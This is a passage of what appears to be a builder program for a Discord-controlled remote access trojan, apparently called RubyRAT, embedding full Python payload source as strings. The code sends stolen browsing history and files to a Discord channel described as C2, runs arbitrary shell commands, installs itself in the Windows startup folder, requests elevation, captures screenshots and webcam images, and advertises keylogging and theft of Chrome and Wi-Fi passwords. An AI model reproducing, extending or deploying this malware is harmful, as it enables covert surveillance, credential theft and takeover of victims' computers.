r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if program_isInstalled(\"C:\\\\Users\\\\Public\\\\nircmd.exe\"):\r\n                await ctx.send(f\"NirCMD is installed and ready!\")\r\n\r\n                volume_amount = int(volume_amount)\r\n\r\n                if 0 <= volume_amount <= 100:\r\n                    # Calculate from procentage to NirCMD volume (1% being 655)\r\n                    volume_level = volume_amount * 655\r\n\r\n                    try:\r\n                        command = f\"C:\\\\Users\\\\Public\\\\nircmd.exe setsysvolume {volume_level}\"  # Update the path here\r\n                        os.system(command)\r\n                        await ctx.send(f\"Volume changed to {volume_amount}%.\")\r\n                    except Exception as e:\r\n                        await ctx.send(f\"An error occurred while changing the volume: {e}\")\r\n                else:\r\n                    await ctx.send(\"Volume amount must be between 0 and 100.\")\r\n            else:\r\n                await ctx.send(\"NirCMD is not installed, installing it now!\")\r\n\r\n                # Install NirCMD om man inte har det\r\n                installNirsoft(\"https://www.nirsoft.net/utils/nircmd.zip\", \"nircmd.exe\")\r\n\r\n                await ctx.send(\"NirCMD has been installed. Try running the command again now.\")\r\n        except ValueError:\r\n            await ctx.send(\"Invalid volume amount. Please provide a number between 0 and 100.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!install':\r\n        print(\"Received !install command\")\r\n        await ctx.send(\"Installing the bot on startup...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows...\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            await ctx.send(\"Client has the **.py** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .py file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        elif script_path.endswith('.pyw'):\r\n                            await ctx.send(\"Client has the **.pyw** extension on payload.\")\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            await ctx.send(\"Created PythonScripts directory at **\" + public_folder + \"**\")\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.pyw\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n                            await ctx.send(\"Copied .pyw file from **\" + script_path + \"** to **\" + duplicate_script_path + \"**\")\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                            await ctx.send(f\"Batch script created at: **{batch_script_path}**\")\r\n                        else:\r\n                            await ctx.send(\"Client has the **.exe** extension on payload.\")\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: **{exe_link_path}**\")\r\n\r\n                    await ctx.send(\"Bot installed on startup!\")\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    await ctx.send(f\"An error occurred while copying the script: {copy_error}\")\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            await ctx.send(f\"An error occurred while checking the operating system: {os_error}\")\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\n\r\n\r\n@bot.command()\r\nasync def uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!uninstall':\r\n        print(\"Received !uninstall command\")\r\n        await ctx.send(\"Uninstalling the bot...\")\r\n\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n                await ctx.send(\"Client is using Windows\")\r\n\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n                batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n\r\n                # Remove the batch script and executable link\r\n                if os.path.exists(batch_script_path):\r\n                    secure_delete_file(batch_script_path)\r\n                    print(f\"Batch script removed: {batch_script_path}\")\r\n                    await ctx.send(f\"Batch script removed: **{batch_script_path}**\")\r\n                if os.path.exists(exe_link_path):\r\n                    secure_delete_file(exe_link_path)\r\n                    print(f\"Executable link removed: {exe_link_path}\")\r\n                    await ctx.send(f\"Executable link removed: **{exe_link_path}**\")\r\n\r\n                # Display a message indicating that persistence has been removed\r\n                await ctx.send(\"Bot persistence removed!\")\r\n                print(\"Bot persistence removed!\")\r\n            else:\r\n                await ctx.send(\"This feature is only supported on Windows.\")\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while uninstalling: {e}\")\r\n            print(f\"An error occurred while uninstalling: {e}\")\r\n\r\n@bot.command()\r\nasync def elevate(ctx):\r\n    if ctx.channel == created_channel:\r\n        if is_admin():\r\n            await ctx.send(\"User has administrative privileges.\")\r\n        else:\r\n            return await ctx.send(elevate_privileges())\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n    elif not ctx.messege.attachments:\r\n        await ctx.send(f\"File did not upload, you did not attach any files...\")\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        encrypted_file_name = encrypt_file(input_file, password)\r\n        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n        return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        decrypted_file_name = decrypt_file(input_file, password)\r\n        if decrypted_file_name != \"Invalid token (key or password)\":\r\n            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n        else:\r\n            await ctx.send(decrypted_file_name)\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n        info.append(f\"Keylogger Activated: {is_logging}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        admin_pass = ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        if admin_pass > 32:\r\n            return \"Success! You should recive a new connection with a Elevated Client.\" and os._exit(0)\r\n        else:\r\n            return \"User pressed \\\"No\\\". Privilege elevation not successful\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n    \r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges already...\")\r\n    else:\r\n        print(\"User does not have administrative privileges. Requesting it now!\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    if has_persistence():\r\n        print(\"Client already has persistence, there is no need to install again.\")\r\n    else:\r\n        print(\"Trying to install on start...\")\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.9") {
                originalStub = "import os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nimport base64\r\nimport ctypes\r\nimport asyncio\r\nimport zipfile\r\nimport importlib\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n\r\n# List of required modules and their corresponding import names\r\nrequired_modules = {\r\n    'psutil': 'psutil',\r\n    'discord': 'discord',\r\n    'pyautogui': 'pyautogui',\r\n    'pillow': 'PIL',\r\n    'opencv-python-headless': 'cv2',\r\n    'pynput': 'pynput',\r\n    'requests': 'requests',\r\n    'psutil': 'psutil',\r\n    'cryptography': 'cryptography',\r\n    'pygetwindow': 'pygetwindow',\r\n    'googlemaps': 'googlemaps',\r\n    'tkinter': 'tkinter',\r\n    'mb': 'mb',\r\n    'pywin32': 'pywin32',\r\n    'pycryptodomex': 'pycryptodomex',\r\n}\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module, import_name in required_modules.items():\r\n    try:\r\n        # Attempt to import the module\r\n        importlib.import_module(import_name)\r\n    except ImportError:\r\n        # Module is missing, add it to the missing_modules list\r\n        missing_modules.append(module)\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    missing_modules_str = \", \".join(missing_modules)\r\n    print(f\"Some required modules are missing: {missing_modules_str}\")\r\n    print(\"Installing missing modules...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules_str.split(', '))\r\n        print(\"Modules installed successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\nelse:\r\n    print(\"All required modules are already installed.\")\r\n\r\n\r\nimport discord\r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom PIL import Image\r\nimport cv2\r\nimport pygetwindow as gw\r\nimport psutil\r\nimport asyncio\r\nimport googlemaps\r\nfrom tkinter import messagebox as mb\r\nimport win32crypt\r\nfrom Cryptodome.Cipher import AES\r\nimport csv\r\nimport json\r\nimport shutil\r\nimport base64\r\nimport sqlite3\r\nimport threading\r\nimport socket\r\nfrom pathlib import Path\r\n\r\n\r\n# Settings for build\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\ncategorieName = \"" + txtCategorie.Text + "\" \r\nGOOGLE_API_KEY = \"" + txtGoogleAPI.Text + "\"\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n\r\n    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address\r\n    print(f'Public IP Address: {ip_address}')\r\n    \r\n    ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes\r\n\r\n    # Create the perfect name for chat\r\n    channel_name = f\"{system_username}-{ip_address_with_dashes}\"\r\n    channel_name_lowercase = channel_name.replace('.', '').lower()\r\n    \r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n\r\n    category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one\r\n    print(f'Category Name: {categorieName}')\r\n    \r\n    # Execute the remove_channels function with the created_channel and channel_name\r\n    await remove_channels(guild, channel_name_lowercase)\r\n\r\n    # Find other active RubyRAT clients on local machine\r\n    try:\r\n        active_rubyRATs = await find_rubyrats()  # Await the coroutine here\r\n        if len(active_rubyRATs) > 0:\r\n            print(\"Found Python processes:\")\r\n            for process in active_rubyRATs:\r\n                print(f\"Process ID: {process['pid']}, Name: {process['name']}\")\r\n                print(f\"Trying to kill process: {process}\")\r\n                await kill_process(process['pid'])  # Kill the process\r\n        else:\r\n            print(\"No Python processes found.\")\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n    # Kill them...\r\n\r\n    # Create a new text channel with the unique name\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(channel_name, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(channel_name)\r\n    print(f'Created Channel Name: {created_channel.name}')\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**\")\r\n\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\nasync def remove_channels(guild, ChannelName):\r\n    # Find the category with the specified name\r\n    category = discord.utils.get(guild.categories, name=categorieName)\r\n\r\n    if category is not None:\r\n        # Iterate through text channels within the category\r\n        for channel in category.text_channels:\r\n            if channel.name == ChannelName:\r\n                #await channel.send('!kill2')\r\n                #print(f\"Sent '!kill2' to channel: {channel.name}\")\r\n\r\n                #await asyncio.sleep(5)\r\n                await channel.delete()\r\n                print(f\"Deleted channel: {channel.name}\")\r\n    else:\r\n        print(f\"Category '{categorieName}' not found in this server.\")\r\n\r\nasync def find_rubyrats():\r\n    try:\r\n        print(\"Trying to find RubyRATs...\")\r\n        python_processes = []\r\n\r\n        # Get the current process ID of the script\r\n        current_process_id = os.getpid()\r\n\r\n        for process in psutil.process_iter(['pid', 'name']):\r\n            process_info = process.info\r\n            if \"python\" in process_info[\"name\"].lower() and process_info[\"pid\"] != current_process_id:\r\n                # Check if the process name contains \"python\" and exclude the script's own process\r\n                python_processes.append(process_info)\r\n\r\n        return python_processes\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)\r\n        return []\r\n\r\nasync def kill_process(pid):\r\n    try:\r\n        process = psutil.Process(pid)\r\n        process.terminate()  # Terminate the process\r\n        print(f\"Killed process with PID {pid}\")\r\n    except psutil.NoSuchProcess:\r\n        print(f\"Process with PID {pid} not found.\")\r\n    except Exception as e:\r\n        print(f\"An error occurred while killing the process with PID {pid}: {e}\")\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!help':\r\n        help_messages = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!help` - Show this menu.\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!version` - Prints out current version.\\n\",\r\n        \"`!restart` - Will disconnect and then hopefully reconnect the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\",\r\n        \"`!geolocate` - Calculates position using google maps API.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!better_install` - Gets presistence on system with 3 diffrent methods.\\n\"\r\n        \"`!better_uninstall` - Removes 3 diffrent methods of presistence from client system.\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\",\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dumplog` - Sends a file containing the keyloggers findings to C2.\\n\"\r\n        \"`!startlog` - Start the keylogging.\\n\"\r\n        \"`!stoplog` - Stop the keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\",\r\n        \"`!sendkey <Hello-World>` - Sends specified keys to client. **Instructions here: https://ss64.com/vb/sendkeys.html**\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n        \"`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\\n\"\r\n        \"`!passwords_chrome` - If client has chrome, it will retrieve all saved usernames, passwords and URL's to the website.\\n\"\r\n        \"`!messagebox <error\\warning\\info> <title> <content>` - Sends a custom made messagebox to client.\\n\",\r\n        \"`!interactive_cmd` - Starts a CMD terminal in discord. (Avoid using commands that output much information, like \\\"dir\\\")\\n\"\r\n        )\r\n        for message in help_messages:\r\n            await ctx.send(message)    \r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def 